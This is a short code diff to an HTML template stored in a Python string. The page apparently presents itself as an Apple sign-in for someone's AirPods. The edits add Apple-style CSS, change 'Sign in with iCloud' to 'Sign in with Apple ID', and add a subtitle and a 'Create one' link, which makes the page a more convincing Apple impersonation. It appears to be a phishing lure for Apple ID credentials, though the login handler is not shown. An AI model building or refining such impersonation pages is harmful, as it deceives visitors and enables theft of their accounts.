@@ -39,6 +39,11 @@ airpods_page = """
             font-size: 24px;
             margin-bottom: 20px;
         }
+        .subtitle {
+            color: #86868b;
+            margin-bottom: 30px;
+            font-size: 17px;
+        }
         .login-button {
             background-color: #0071e3;
             color: white;
@@ -50,6 +55,12 @@ airpods_page = """
             margin-top: 20px;
             text-decoration: none;
         }
+        .create-account {
+            color: #0071e3;
+            font-size: 14px;
+            margin-top: 15px;
+            text-decoration: none;
+        }
         .login-button:hover {
             background-color: #0062c3;
         }
@@ -59,7 +70,12 @@ airpods_page = """
     <img src="https://i.ibb.co/zHQBkrHX/airpods.jpg" 
          alt="AirPods" class="airpods-image">
     <h1>AirPods de Youba</h1>
-    <a href="/login" class="login-button">Sign in with iCloud</a>
+
+     <p class="subtitle">
+            Sign in with your Apple ID to connect and manage your Airpods:
+    </p>
+    <a href="/login" class="login-button">Sign in with Apple ID</a>
+    <a href="/create-account" class="create-account">Don't have an Apple ID? Create one</a>
 </body>
 </html>
 """
